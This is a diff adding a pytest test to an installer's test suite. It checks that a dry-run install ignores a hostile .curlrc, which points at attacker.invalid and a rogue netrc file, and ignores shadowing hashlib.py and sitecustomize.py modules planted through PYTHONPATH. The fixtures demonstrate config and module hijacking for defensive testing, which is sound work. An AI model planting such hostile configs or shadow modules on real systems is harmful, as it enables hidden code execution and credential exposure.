@@ -1376,6 +1376,85 @@ def test_stdin_dry_run_rejects_unverified_helper_without_target_claim(
 
 
 @POSIX_SHELL_ONLY
+def test_stdin_planner_ignores_hostile_curl_and_python_configuration(
+    tmp_path: Path,
+) -> None:
+    user_home = tmp_path / "user"
+    user_home.mkdir()
+    preferred_bin = user_home / "preferred-bin"
+    preferred_bin.mkdir()
+    curl_side_effect = tmp_path / "curl-config-loaded"
+    python_side_effect = tmp_path / "python-shadow-loaded"
+    user_home.joinpath(".curlrc").write_text(
+        (
+            f'output = "{curl_side_effect}"\n'
+            f'trace = "{tmp_path / "curl-trace"}"\n'
+            "url = https://attacker.invalid/extra\n"
+            f'netrc-file = "{tmp_path / "hostile-netrc"}"\n'
+        ),
+        encoding="utf-8",
+    )
+    hostile_cwd = tmp_path / "hostile-python"
+    hostile_cwd.mkdir()
+    hostile_cwd.joinpath("hashlib.py").write_text(
+        (
+            "import os\n"
+            "from pathlib import Path\n"
+            "Path(os.environ['PYTHON_SIDE_EFFECT']).touch()\n"
+            "raise RuntimeError('cwd hashlib shadow loaded')\n"
+        ),
+        encoding="utf-8",
+    )
+    hostile_cwd.joinpath("sitecustomize.py").write_text(
+        (
+            "import os\n"
+            "from pathlib import Path\n"
+            "Path(os.environ['PYTHON_SIDE_EFFECT']).touch()\n"
+        ),
+        encoding="utf-8",
+    )
+    fetch_environment = _fake_launcher_helper_fetch(tmp_path)
+    fake_tools = Path(fetch_environment["PATH"].split(os.pathsep, maxsplit=1)[0])
+    fake_tools.joinpath("curl").write_text(
+        (
+            "#!/bin/bash\n"
+            'if [[ "${1:-}" != "--disable" ]]; then\n'
+            '  : >"$CURL_CONFIG_SIDE_EFFECT"\n'
+            "  exit 91\n"
+            "fi\n"
+            'exec /bin/cat -- "$FAKE_LAUNCHER_HELPER_PATH"\n'
+        ),
+        encoding="utf-8",
+    )
+    fake_tools.joinpath("curl").chmod(0o755)
+    fetch_environment["PATH"] = (
+        f"{fake_tools}{os.pathsep}{preferred_bin}"
+        f"{os.pathsep}{os.environ.get('PATH', '')}"
+    )
+
+    result = _run_install_stdin(
+        env={
+            **fetch_environment,
+            "HOME": str(user_home),
+            "CURL_HOME": str(user_home),
+            "CURL_CONFIG_SIDE_EFFECT": str(curl_side_effect),
+            "PYTHONPATH": str(hostile_cwd),
+            "PYTHONSTARTUP": str(hostile_cwd / "sitecustomize.py"),
+            "PYTHON_SIDE_EFFECT": str(python_side_effect),
+            "KESTREL_DRY_RUN": "1",
+            "KESTREL_HOME": str(user_home / "kestrel-home"),
+        },
+        cwd=hostile_cwd,
+    )
+
+    assert result.returncode == 0, result.stderr
+    assert str(preferred_bin / "kestrel") in result.stdout
+    assert not curl_side_effect.exists()
+    assert not python_side_effect.exists()
+    assert not (tmp_path / "curl-trace").exists()
+
+
+@POSIX_SHELL_ONLY
 def test_install_dry_run_can_disable_server_autostart(tmp_path: Path) -> None:
     result = _run_install(
         env={
